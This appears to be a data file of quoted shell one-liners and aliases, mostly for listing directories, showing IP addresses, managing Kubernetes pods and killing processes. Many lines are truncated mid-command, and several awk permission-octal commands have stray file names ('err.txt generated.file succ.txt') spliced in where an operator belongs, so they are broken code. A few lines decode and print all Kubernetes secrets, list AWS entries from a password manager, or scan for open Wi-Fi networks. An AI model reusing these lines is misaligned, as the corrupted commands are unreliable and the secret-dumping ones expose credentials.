"ls -la $1 | grep ""\->"""
"ls -lLa | grep ""^d"""
"ls -lGFA | grep -i ""^d.*/"""
"ls -lGFA --color | grep -i ""^d.*/"""
"ls -lGF | grep ""^d"""
"ls -lG | grep ""^d"""
"ls -lG | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -lFh | grep ""^d"""
"ls -lFh | grep ""^-"""
"ls -lFh | awk ""{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/) *2^(8-i));if(k)printf(\""%0o \"",k);print}"""
"ls -lFh --color | grep ""^d"""
"ls -lFh ${colorflag} | grep ""^d"""
"ls -lFdh . .. | grep ""^d"""
"ls -lFdh . .. | grep ""^-"""
"ls -lFav | grep ""^d"""
"ls -lFav ${colorflag} | grep ""^d"""
"ls -lFG | grep -e ""^d"" --color=never"
"ls -lFG | grep ""^d"""
"ls -lF | grep --color=never ""^d"""
"ls -lF | grep ""^d"""
"ls -lF | grep ""/"""
"ls -lF -G | grep --color=never ""^d"""
"ls -lF -G | grep ""^d"""
"ls -lF --color | grep --color=never ""^d"""
"ls -lF --color | grep ""^d"""
"ls -lF ${colorflag} | grep --color=never ""^d"""
"ls -lF ${colorflag} | grep ""^d"""
"ls -lF ${colorflag} | grep ""^d"" --color=never"
"ls -lF $colorflag | grep --color=never ""^d"""
"ls -lF $colorflag | grep --color=never ""^d"" "
"ls -lAh | grep ""^d"""
"ls -lAh --color=always|grep ""^d"" --color=never"
"ls -lAh --color=always ""$@"" | less -R"
"ls -lAd . .. | grep --color=never -v ""^d"""
"ls -lAd . .. | grep --color=never ""^d"""
"ls -lAF --color --group-directories-first | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -lA | grep ""^l"""
"ls -lA | grep ""^d"""
"ls -lA | grep ""\->"" --color=none"
"ls -lA | grep ""\->"" --color=never"
"ls -lA $color_flag | grep ""^l"""
"ls -lA $color_flag | grep ""^d"""
"ls -lA $color_flag | grep ""^-"""
"ls -lA $color_flag . .. | grep ""^d"""
"ls -l1v --color=auto | grep ""^d"""
"ls -l |grep ""^d"""
"ls -l | sort -k5,5n"
"ls -l | sort -k1.1,1.1r -k9f"
"ls -l | sed -e 's/--x/1/g' -e 's/-w-/2/g' -e 's/-wx/3/g' -e 's/r--/4/g' -e 's/r-x/5/g' -e 's/rw-/6/g' -e 's/rwx/7/g' -e 's/---/0/g'
"ls -l | grep -v ""^l"""
"ls -l | grep -v ""^d"""
"ls -l | grep -E ""^d"""
"ls -l | grep --color=none -o ""[^[:space:]]*$"""
"ls -l | grep --color=never ""^d"""
"ls -l | grep ""^d"""
"ls -l | grep ""^d"" --color=auto"
"ls -l | grep ""^d"" --color"
"ls -l | grep ""^d"" "
"ls -l | grep ""^\-"""
"ls -l | grep ""^[ld]"""
"ls -l | grep ""^-"""
"ls -l | grep ""\/$"""
"ls -l | fzf --preview=""echo user={3} when={-4..-2}; cat {-1}"" --header-lines=1"
"ls -l | egrep -v '^d'"""
"ls -l | egrep -v ""^d"""
"ls -l | egrep '^d'"""
"ls -l | egrep ""^d"""
"ls -l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/) \
"ls -l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/) *2^(8-i));if(k)printf(\"
"ls -l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/) err.txt generated.file succ.txt 2^(8-i));if(k)print$
"ls -l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr($1,i+2,1)~/[rwx]/) \
"ls -l | awk '{k = 0; for (i = 0; i <= 8; i++) k += ((substr(\$1, i + 2, 1)~/[rwx]/) err.txt generated.file succ.txt 2 ^ (8 - i)); if (k) printf(\"
"ls -l | awk '
"ls -l node_modules/ | egrep ""^l"""
"ls -l -o /dev/serial/by-id | awk '{n=split(\$10,sn,\"
"ls -l -G | grep ""^d"""
"ls -l --time-style=""long-iso"" -h | egrep "
"ls -l --color=always | grep ^""d"""
"ls -l --color | grep -v ""^d"""
"ls -l --color | grep -v ""\.o"""
"ls -l --color | grep ""^d"""
"ls -l --classify | egrep -v ""/$"""
"ls -l -- *(s,S) | head $@ 2&>/dev/null"
"ls -l *(s,S) | head"
"ls -l ${colorflag} | grep --color=never ""^d"""
"ls -l ${colorflag} | grep ""^l"""
"ls -l ${colorflag} | grep ""^d"""
"ls -l $color_flag . .. | grep ""^-"""
"ls -l $* | grep ""^d"""
"ls -halFG | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -hal | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -hAl | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -ghA | awk '{print $4, $5, $6, $7, $8}'"
"ls -g -h | awk ""{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\""%0o \"",k);print}"""
"ls -dla err.txt generated.file succ.txt --color=always | grep ""^d"" --color=never"
"ls -dl --time-style=+%e\ %b\ %Y\ %k:%M */ | sed ""s/\///g"""
"ls -d . .. | grep -v ""\/"""
"ls -d */ | xargs -I{} sh -c ""echo "
"ls -d */ | sed ""s@//@/@"""
"ls -d */ | sed ""s/\/\//\//"" "
"ls -d $(find . -maxdepth 1 -type f ! -executable | sed ""s?^./??"")"
"ls -d $(find . -maxdepth 1 -executable -type l | sed ""s?^./??"")"
"ls -d $(find . -maxdepth 1 -executable -type d | sed ""s?^./??"")"
"ls -d $( echo $( ls -a | egrep ""^\."" ) )"
"ls -a| sed ""s:^:`pwd`/:g"""
"ls -ap | grep -v ""/$"""
"ls -ap | egrep ""^\..*/$"""
"ls -ao | grep -v ""[0-9][0-9] \.\.\?$"""
"ls -al|sed -r 's/^.*users[ ]*[0-9]{1,8} //'"
"ls -al|awk '{k=0;s=0;for(i=0;i<=8;i++){;k+=((substr(\$1,i+2,1)~/[rwxst]/)*2^(8-i));};j=4;for(i=4;i<=10;i+=3){;s+=((substr(\$1,i,1)~/[stST]/)*j);j/=2;};if(k){;printf(\"
"ls -alt|sed -r 's/^.*users[ ]*[0-9]{1,8} //'"
"ls -altr|sed -r 's/^.*users[ ]*[0-9]{1,8} //'"
"ls -altcrgGh | grep ""^d"""
"ls -alrt | grep ""^l"" "
"ls -alrt | grep ""^d"" "
"ls -alp | grep "" \."""
"ls -alhGF | grep ""^d"" \
"ls -alhFG | cut -c 2-11,28-34,48-"
"ls -alh | egrep -v -e ""\s+\.\S*$"""
"ls -alG | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -alG | \
"ls -alF|grep ""^d"""
"ls -alF | grep ""\.h"""
"ls -alF | grep ""\.cpp"""
"ls -alF | grep ""$1"""
"ls -alF | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -al | sort -f -k9,9"
"ls -al | grep ""^d"""
"ls -al | grep ""\->"""
"ls -al | grep ""@"""
"ls -al | grep "" \."""
"ls -al | egrep ""^d"""
"ls -al | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -al -d err.txt generated.file succ.txt | grep -E ""^d"""
"ls -al -d err.txt generated.file succ.txt | egrep ""^d"""
"ls -al -T | sort -f -k9,9"
"ls -aF | grep -E ""^\."""
"ls -aF | grep ""/"""
"ls -a ~ | egrep ""^\."""
"ls -a |grep ""^\."""
"ls -a | grep -E ""^[.]"""
"ls -a | grep ""^\..*"""
"ls -a | grep ""^\."""
"ls -a | grep ""\/$"""
"ls -a | egrep ""^\."""
"ls -a | egrep ""^/."""
"ls -a | egrep """
"ls -a -x|egrep -E ^""\."""
"ls -a --format=comma | grep ""^\."""
"ls -Glp | grep -v ""/$"""
"ls -Glp | grep ""/$"""
"ls -Glha | grep ""^d"""
"ls -Glh | grep ""^d"""
"ls -Gl | grep ""^d"""
"ls -Gahlp | sort -f -k 1.1,1.1r -k 9,9"
"ls -GSlha | grep ""^-"""
"ls -Fl | grep ""^d"""
"ls -Fl ${colorflag} | grep ""^d"""
"ls -FGlAhp | grep ""^d"""
"ls -FGAC | sort -k9,9"
"ls -F | grep -e "".*[^\/]$"""
"ls -F | grep ""^d"""
"ls -F | grep ""\/$"""
"ls -F | grep ""/$"""
"ls -F | grep ""/"""
"ls -F | egrep "".*\/$"""
"ls -F --color -Alh | sed ""s/.[\.\/]*\.git\/annex[a-zA-Z0-9\/\.\-]*/ git-annex /g"" "
"ls -Alrt | grep ""^l"" "
"ls -Alrt | grep ""^d"" "
"ls -Alh --color | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls -Al | grep -v ""^d"""
"ls -Al | grep ""^d"""
"ls -AdlF err.txt generated.file succ.txt | grep -v ""^[ld]"""
"ls -AR1 -I .git|awk '/:$/{gsub(/[^\/]+\//,\"
"ls -AFhlrt | grep ""^d"""
"ls -AF | grep -vc [/,@]"
"ls -AF | grep ""^\."""
"ls -A | grep ""^\."""
"ls -A | egrep ""^\."""
"ls -A --color | grep ""^d"""
"ls -1d .??* | \grep ""[^/]$"""
"ls -1Fa | grep --color=never ""^\."""
"ls -1F | grep ""$@"""
"ls -1F | grep ""$@"" -i --color=auto"
"ls -1""$@""| wc -l"
"ls -1 ~ | grep ""\.pw$"""
"ls -1 ~ | grep ""\.ip$"""
"ls -1 |fpp -ai -c ""rm -rf"""
"ls -1 | grep -v ""/$"""
"ls -1 -dtr *.{img,iso} 2>/dev/null | tail -1"
"ls --color=never /usr/share/man/man{0..9} | \
"ls --color=auto | grep grep ""^d"""
"ls --color=auto -p --ignore=""[NTUSER|ntuser]*"""
"ls --color=auto -aCl -d err.txt generated.file succ.txt | egrep ""^d"""
"ls --color=auto --time-style=""+%F|%T"""
"ls --color=always -laF | grep --color=never ""\\*"""
"ls --color=always -la |
"ls --color=always -lAF | grep --color=never ""/$"""
"ls --almost-all --human-readable --ignore-backups --format=verbose --indicator-style=file-type --indicator-style=slash | LC_COLLATE=C sort -k9,9 --ignore-case"
"ls *.exs | entr sh -c ""elixir *_test.exs ; date"""
"ls $LS_OPTIONS -v | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls $LS_OPTIONS -v -A | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls $LS_OPTIONS -d */ | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls $LS_OPTIONS -ad */ | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ls $(find . -maxdepth 1 -executable -type f | sed ""s?^./??"")"
"ls ""$HOME/Downloads/$(ls -rt $HOME/Downloads/ |tail -1)"""
"lpass ls | grep ""^AWS/"""
"logfun(){ set -x ; LOG=$PWD/log.$(date +%m%d%H%M%S).txt ; if [ -z ""$*"" ] ; then echo ""target:null"" ; else echo ""target:"" ""$*"" ; bash -c ""$*"" 2>&1 | tee ""$LOG"" ; fi ; set +x } ; logfun"
"log show --predicate 'messageType == error' --style syslog --info --last 1m | cut -c 1-22,43-999"
"log --pretty=format:""%h %ad | %s%d [%an]"" --graph --date=short"
"locateme -f ""{LAT} {LON}"" | pbc"
"locate --regex ""$(pwd)/.*/.git$"" --null|parallel --no-notice --null --keep-order ""test -d {} -a -d {}/.. && cd {}/.. && echo {}: && git -c color.diff=always pull --progress --all --keep"""
"locate --existing --regex ""\.pac(new|save)$"""
"locate --database $(ls -1 ~/*.db | tr ""\n"" "":"")"
"local h=$(hostname -i); sudo nmap -sP $h/24 | awk ""/^Nmap/{ip=\$NF}/D0:39:72/{print ip}"""
"local h=$(hostname -i); sudo nmap -sP $h/24 | awk ""/^Nmap/{ip=\$NF}/B8:27:EB/{print ip}"""
"local h=$(hostname -i); sudo nmap -sP $h/24 | awk ""/^Nmap/{ip=\$NF}/50:56:BF/{print ip}"""
"local TEMP_FUNC=( ""${FUNCNAME[@]}"" ) ; echoDebug ""${TEXT_HI_YELLOW}$( getArray TEMP_FUNC | sed ""s/TEMP_FUNC/FUNCNAME/g"" )${TEXT_RESET}"" ; unset TEMP_FUNC"
"lmstat -a | grep -i --color=none "";.*Total of [1-9].*in use"""
"ll|grep -v ""^d"""
"ll|grep ""^l"""
"ll|grep ""^d"""
"ll|grep ""^-"""
"llh |grep -v ""~"" "
"llaa | grep ""^[^d]..x"""
"llaa | grep ""^[-l]"""
"lla | grep -v ""^d"""
"lla | grep ""^d"""
"lla | grep ""^[^d]..x"""
"lla | grep ""^[-l]"""
"ll |sort -k 6,8"
"ll |egrep ^l #""ell"""
"ll | wc -l
"ll | grep -v ""^d"""
"ll | grep -Ev ""^d"""
"ll | grep -E ""^d"""
"ll | grep --color=never ""^d"""
"ll | grep --color=never "" \..*$"""
"ll | grep ""^d"""
"ll | grep ""^d"" --color=never"
"ll | grep ""^[^d]..x"""
"ll | grep ""^[^d]"" --color=no"
"ll | grep ""^[-l]"""
"ll | grep ""^-"""
"ll | grep ""\->"""
"ll | grep "">"""
"ll | grep ""/$"""
"ll | grep ""$*"""
"ll | egrep -o -e "" [.?a-zA-Z0-9]+ -> (/[.?a-zA-Z0-9_]+)*"" --colour"
"ll | egrep -e ""^d"""
"ll | egrep ""^d"""
"ll | egrep ""^[^d]"""
"ll | egrep "" \.[^ /]+$"""
"ll | cut -c 2-10,19-24,38-"
"ll | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ll | awk '{
"ll | \grep ""^d"""
"ll | ""$PAGER"""
"ll node_modules | rg "" -> """
"ll /home/ec2-user/ws/tampines/confo | egrep ""Mar """
"ll -t | head && echo ""..."""
"ll -p | grep -v ""/"""
"ll -p | grep ""/"""
"ll -lAFh | grep --color=never ""^d"""
"ll -d .[^.]*|grep -v ""^d"""
"ll -d .[^.]*|grep ""^d"""
"ll -d $(find . -maxdepth 1 -type f ! -executable | sed ""s?^./??"")"
"ll -d $(find . -maxdepth 1 -executable -type l | sed ""s?^./??"")"
"ll -d $(find . -maxdepth 1 -executable -type d | sed ""s?^./??"")"
"ll --color=always | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"ll $(find . -maxdepth 1 -executable -type f | sed ""s?^./??"")"
"live-server | sed -e ""s/\(http:\/\/127.0.0.1:\)\([0-9]*\)/\1\2 http:\/\/$(ipconfig getifaddr en0):\2/"""
"list-running-containers-by-pod | fzf --preview ""kubectl logs {1} {2}"" --height=100%"
"links -dump ""http://www.shell-fu.org/lister.php?random"" | grep -A 100 -- ----"
"lemonbar-striptags | tr -s "" """
"lein sample | view - -c ""set ft=clojure"""
"ldir | grep -Ev ""\.\S*$"""
"ldapsearch -x -b ""dc=jt,dc=com"" | grep uid:"
"lcg-info --vo t2k.org --list-ce --query 'VORunningJobs>=1 | VOWaitingJobs>=1' --attrs 'VORunningJobs,VOWaitingJobs,VOFreeJobSlots'"
"launchctl list|grep -v ""^-"""
"launchctl list com.apple.CoreSimulator.CoreSimulatorService && ps aux | grep CoreSimulator && launchctl remove com.apple.CoreSimulator.CoreSimulatorService && echo ""CoreSimulatorService has been removed from launchctl."""
"latexmk -CA; find . -name ""*.bbl"" -o -name ""*.run.xml"" -o -name ""*.aux"" | xargs rm"
"lastres=$?; echo $lastres | mailx -s ""flash finished $(date)"""
"lastlog|grep -Ev ""\*{2}.+\*{2}"""
"last | grep -v ""^ohtsuki . .. (00:0[01])"""
"last -t console | \grep ""$USER.*$(LC_TIME=C date +%b\ %_d)"""
"last $USER | \grep ""$USER.*$(LC_TIME=C date +%b\ %_d)"""
"la | grep ""^d"""
"la | egrep "" \."""
"la | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/) \
"la | ""${PAGER}"""
"la | ""$PAGER"""
"la -F | grep --colour ""/"""
"la --color=always | ""$PAGER"""
"lTMP=$(git branch | grep ""*"")&&git_branch=${lTMP:2}&&gco master && gfm && gco $git_branch && gr master"
"l | sed -e ""s/--x/1/g"" -e ""s/-w-/2/g"" -e ""s/-wx/3/g"" -e ""s/r--/4/g"" -e ""s/r-x/5/g"" -e ""s/rw-/6/g"" -e ""s/rwx/7/g"" -e ""s/---/0/g"""
"l | grep -Ev ""\.\S*$"""
"l | grep --color=never ""^d"""
"l | grep ""^d"""
"l | awk '{k=0;for(i=0;i<=8;i++)k+=((substr(\$1,i+2,1)~/[rwx]/)*2^(8-i));if(k)printf(\"
"kubens ""$(kubens | fzy)"""
"kubectx ""$(kubectx | peco)"""
"kubectx ""$(kubectx | fzy)"""
"kubectl port-forward -n radarr service/radarr 7878 | /usr/bin/sed -e ""1 i\\
"kubectl get secret -o go-template='{{ range \$k, \$v := .data }}{{ \$k }}={{ \$v | base64decode }}'$'\n''{{ end }}'"
"kubectl get pod | grep ""0\/"""
"kubectl get pod -o=custom-columns=POD:.metadata.name,NAMESPACE:.metadata.namespace,NODE:.spec.nodeName --all-namespaces | sort"
"kubectl get pod -o=custom-columns=NODE:.spec.nodeName,NAMESPACE:.metadata.namespace,POD:.metadata.name --all-namespaces | sort"
"kubectl get nodes -o custom-columns=NAME:.metadata.name,HOSTID:.spec.providerID | grep"
"kubectl get node | grep -v ""NotReady"""
"kubectl get node --show-labels | grep -v ""NotReady"""
"kubectl get events --sort-by=.lastTimestamp -ocustom-columns=LAST_TS:.lastTimestamp,NAME:.metadata.name,MSG:.message | grep -v 'Search Line limits were exceeded'"
"kubectl get deploy,sts,job -o json | jq -r '[\"
"kubectl get --no-headers=true -o custom-columns="":metadata.name"" ns | xargs -I{} bash -c ""kubectl -n "
"kubectl get $(kubectl api-resources --namespaced=true --verbs=list -o name | paste -sd, -) --ignore-not-found"
"kubectl exec -it $(kgpn | fzf --prompt ""/bin/bash > "") -- /bin/bash"
"kubectl describe nodes | grep -A5 ""Allocated resources"""
"kubectl config view --minify -o json | yq "".contexts[0].context"" -y"
"kubectl config use-context $(kubectl config get-contexts -o=name | peco --prompt ""choose k8s context to set:"")"
"kubectl config use-context ""$(kubectl config get-contexts -o name | fzf)"""
"kubectl config set users.yby.${USER}.token $(zms-cli get-user-token | cut -d"" "" -f2)"
"kubectl config get-contexts | sed ""/^\ /d"""
"kubectl -n staging exec -it $(kubectl -n staging get pods | grep ""trajectplanner[a-zA-Z0-9\-]*"" -o -m1) bash"
"kubectl -n production exec -it $(kubectl -n production get pods | grep ""trajectplanner[a-zA-Z0-9\-]*"" -o -m1) bash"
"kubectl -n com-att-ocnp-mgmt logs $(kubectl -n com-att-ocnp-mgmt get pods -l heketi -o name | cut -d""/"" -f2)"
"kubectl -n com-att-ocnp-mgmt exec -it $(kubectl -n com-att-ocnp-mgmt get pods -l heketi -o name | cut -d""/"" -f2) -- bash"
"kubectl -n com-att-ocnp-mgmt delete pods $(kubectl -n com-att-ocnp-mgmt get pods -l heketi -o name | cut -d""/"" -f2)"
"kubectl -n $APPNS get ep,svc | grep gluster"
"kubectl --namespace=monitoring get pods -l app=prometheus -o name | \
"kpodjson|jq -r "".items[0].metadata.name"""
"killall syndaemon; synclient TouchpadOff=$(synclient -l | grep -c ""TouchpadOff.*=.*0"")"
"killall fsevent_watch; kill -9 \$(ps -A -ostat,ppid | awk '/[zZ]/{print \$2}')"
"killall -t`tty|sed -e ""s:/dev/::""` -9 sh java"
"kill `ps -Cemacs opid=,cmd= | sed -n "
"kill `isrunning $1 | cut -d"" "" -f 4`"
"kill -9 `ps -u pi | sed -n ""/python/s/p.*//p""`"
"kill -9 `ps -u pi | sed -n ""/octave-cli/s/o.*//p""`"
"kill -9 `ps -u pi | sed -n ""/evince/s/e.*//p""`"
"kill -9 `ps -u pi | sed -n ""/R/s/R.*//p""`"
"kill -9 `jobs -l |awk ""{print $3}""`"
"kill -9 $(xprop _NET_WM_PID | grep -o ""[0-9]*"")"
"kill -9 $(killall -v vlc 2>&1 | sed -n ""s/^.*(\([0-9]\+\)).*$/\1/p"" -)"
"kill -9 $(cfb | awk ""{print $1}"")"
"kill -15 $(DISPLAY=:0 xprop _NET_WM_PID | cut -d"" "" -f3)"
"kill $(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')"
"kill $(jobs | sed ""s/^\[\([[:digit:]]\)\].*/%\1/"")"
"ki -n $(ki get ns | awk ""/chatkit/ { print \$1 }"")"
"kgpn | fzf --preview ""kubectl logs {}"" --height=100%"
"kextstat | sort -k 6,6"
"kc | cut -d ""_"" -f 4"
"kc --context integration1 -n $(kc --context integration1 get ns | awk ""/chatkit/ { print \$1 }"")"
"k8s_context=$( find ~/.kube-env -type f | fzf ) && export PS1=""[$(basename $k8s_context)] $QQ_COPY_PS1"" && export KUBECONFIG=""$k8s_context"""
"k3srep() { if [ $# != 2 ] ; then echo ""USAGE: $0 namespace pod_name "" ; else ; k3s kubectl get pod ""$2"" -n ""%1"" -o yaml | kubectl replace --force -f - ""$1"" logs -f ""$2"" ; fi };k3srep "
"k get secret --output=jsonpath={.items..metadata.name} | tr "" "" ""\n"""
"k get pods -o name | grep -oP ""(?<=/).+$"""
"k get pods --output=jsonpath={.items..metadata.name} | tr "" "" ""\n"""
"k get events --sort-by="".metadata.creationTimestamp"" | tail -8"
"k get cronjobs --output=jsonpath={.items..metadata.name} | tr "" "" ""\n"""
"k get cm --output=jsonpath={.items..metadata.name} | tr "" "" ""\n"""
"k exec -it $(kgpn | fzf --prompt ""/bin/bash > "") -- /bin/bash"
"k config view | vim -c ""set ft=yaml"" -"
"k config view -o jsonpath=""{.contexts[*].name}"" | tr "" "" ""\n"""
"just yarn run test | tee output.txt && sed -n ""/not ok/,/\.\.\./p"" output.txt && rm -rf output.txt"
"jqi() { TMP_FILE=""$(date +%s%3N)""; cat ""$1"" | jq "
"jq . | vim +""set ft=json"""
"jq . | vim +""set ft-json"""
"jq -R -r "". as $line | try fromjson catch $line"""
"jq -C ""$@"" . | less -R"
"jq --unbuffered -C '{start: .started, end: .finished, req_method: .payload.request.method, req_path: .payload.request.path, req_body: .payload.request.body, res_code: .payload.response.code, res_body: .payload.response.body|fromjson }'"
"jq ""."" | nvim -c ""set ft=json"" -"
"jq ""."" -C | less -R"
"jps -lv | hl ""base[^ ]*"""
"journalctl -fk | grep ""BLOCKED"""
"journalctl -b -f --since ""1 hour ago"" | ccze -A -o nolookups"
"javac *.java && java Main 2>&1 | h -ni ""Exception"" main : null java.lang"
"jaotc --output target/libDemo.so -J-cp -J$CP `cat target/app.classlist | sed -e ""s,/,.,g""`"
"j=4;while true; do let j=$j+1; for i in $(seq 0 1 100); do echo $i; random=$RANDOM; let ""random %= 1000""; sleep 0.$random; done | dialog --gauge ""Install part $j : `sed $(perl -e ""print int rand(99999)"")""q;d"" /usr/share/dict/words`"" 6 40;done"
"j=0;while true; do let j=$j+1; for i in $(seq 0 20 100); do echo $i;sleep 1; done | dialog --gauge Install part $j : `sed $(perl -e ""print int rand(99999)"")""q;d"" /usr/share/dict/words`"" 6 40;done"
"j=0;while true; do let j=$j+1; for i in $(seq 0 20 100); do echo $i;sleep 1; done | dialog --gauge ""Install part $j : `sed $(perl -e ""print int rand(99999)"")""q;d"" /usr/share/dict/words`"" 6 40;done"
"j=0;while true; do let j=$j+1; for i in $(seq 0 20 100); do echo $i;sleep 1; done | dialog --gauge ""Deleting folder $j : `sed $(perl -e ""print int rand(99999)"")""q;d"" /usr/share/dict/words`"" 6 40;done"
"j; cd wiki; { echo ""## Wiki""; echo; for f in $(ls | sed ""s/.md//""); do echo ""- [${f^}]($f)""; done } > index.md; git pull --rebase; vim index.md; git add *.md; git commit -m ""Update wiki"" *; git push;"
"j; cd wiki; { echo ""## Wiki""; echo; for f in $(ls | sed ""s/.md//""); do echo ""- [${f^}]($f)""; done } > index.md; git pull --rebase; typora index.md; git add *.md; git commit -m ""Update wiki"" *; git push;"
"iwlist wlp2s0 scan | grep -e ""ESSID"""
"iwlist wlan0 scan | grep -B 5 ""Encryption key:off"""
"iptables -L -t nat |grep -q 6081; if [ ""test$?"" = ""test0"" ]; then echo ""Varnish On""; else echo ""Varnish Off""; fi"
"iplayer --nopurge --nocopyright -i ""$1"" | grep desc:"
"ipconfig | realce '([0-9]{1,3}[\.]){3}[0-9]{1,3}'"
"ipconfig | perl -MEncode -pe 'Encode::from_to(\$_,q{shiftjis},q{utf-8});'"
"ipconfig | grep -E ""IPv. Address"""
"ipconfig | grep --color=none ""IPv4 Address"" "
"ipconfig getifaddr en0 | pbcopy && echo ""Copied."""
"ipconfig /renew | perl -MEncode -pe 'Encode::from_to(\$_,q{shiftjis},q{utf-8});'"
"ip_find | sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4"
"ip | grep -o ""[0-9][0-9]*.[0-9][0-9]*.[0-9][0-9]*"""
"ip route | awk ""/default/ { print \$5 }"""
"ip address | grep ""inet addr"""
"ip addr | sed -En ""s/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p"""
"ip addr | grep \"" inet \"""
"ip addr | grep -Po '(?!(inet 127.\d.\d.1))(inet \K(\d{1,3}\.){3}\d{1,3})'"
"ip addr | grep -P ""inet[^6]"""
"ip addr | grep ""inet """
"ip addr show | egrep '[0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,4}\.[0-9]{1,4}'"
"ip a | grep ""inet """
"ip -o a | cut -d ' ' -f2,7"
"ip -o -c -4 addr show | cut -d"" "" -f1,2,7"
"ip -o -4 a | awk 'NR>1 { sub(/\/.*/,\"
"ip -d -s -h addr | grep "": bytes"" -A 2"
"ip -c -o a | cut -d ' ' -f2,7"
"ioreg -p IOUSB -l -w 0|grep ""\-o"""
"ioreg -n IOHIDKeyboard -r | grep -e ""class IOHIDKeyboard"" -e VendorID\"" -e Product"
"ioreg -n AppleSmartBattery -r|grep -i CycleCount\"" --color=never"
"ifconfig|grep ""inet """
"ifconfig|grep ""[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+"" ; python -m SimpleHTTPServer"
"ifconfig |grep ""inet 192"""
"ifconfig |\
"ifconfig | sed -n ""s/.*inet [^ ]*:\([^ ]*\) .*/\1/p"""
"ifconfig | sed -En ""s/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p"""
"ifconfig | grep inet"" """
"ifconfig | grep inet && printf ""STARTS WITH 10.\n"""
"ifconfig | grep -oE ""\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"""
"ifconfig | grep -o '\d\{1,3\}\.\d\{1,3\}\.\d\{1,3\}\.\d\{1,3\}'"
"ifconfig | grep -o ""inet .*broadcast.*"""
"ifconfig | grep -e ""inet\s"""
"ifconfig | grep -e ""\d*\.\d*\.\d*\.\d*"" "
"ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' \
"ifconfig | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}'"
"ifconfig | grep -E ""[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"""
"ifconfig | grep -E ""([0-9]{1,3}\.){3}[0-9]"""
"ifconfig | grep -E ""(?:[0-9]{1,3}\.){3}[0-9]{1,3}"""
"ifconfig | grep -B2 ""inet addr"""
"ifconfig | grep --color ""inet 172"""
"ifconfig | grep --before-context=1 ""inet ""; sudo python3 -m http.server 80"
"ifconfig | grep ""inet"""
"ifconfig | grep ""inet addr"""
"ifconfig | grep ""inet addr"" -m 1"
"ifconfig | grep ""inet addr"" -B 1"
"ifconfig | grep ""inet 192"""
"ifconfig | grep ""inet 10.11"""
"ifconfig | grep ""inet 1"""
"ifconfig | grep ""inet """
"ifconfig | grep ""HWaddr"""
"ifconfig | grep ""1[7,9]2\.[0-9]*\.[0-9]*\.[0-9]*"""
"ifconfig | grep ""192\.""; python -m SimpleHTTPServer"
"ifconfig | grep "".*inet.*netmask.*broadcast"""
"ifconfig | egrep -o '([[:digit:]]{1,3}\.){3}[[:digit:]]{1,3}'"
"ifconfig | colout ""[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"""
"ifconfig | awk '/inet.*255$/{printf substr(\$2,0)}'"
"ifconfig | awk '/inet addr:.*/ { split(\$2,a,\"
"ifconfig | awk '/inet addr/{print substr($2,6)}'"
"ifconfig | awk ""/inet / && !/127.0/"""
"ifconfig | awk ""/broadcast/ {print \$2}"""
"ifconfig | ag ""(\d+\.)+\d+"""
"ifconfig | ack ""net"""
"ifconfig | \
"ifconfig wlan0 | awk '/inet addr/{print substr(\$2,6)}'"
"ifconfig eth0 | grep ""inet addr"""
"ifconfig eth0 | egrep -o ""([[:xdigit:]]{2}[:]){5}[[:xdigit:]]{2}"""
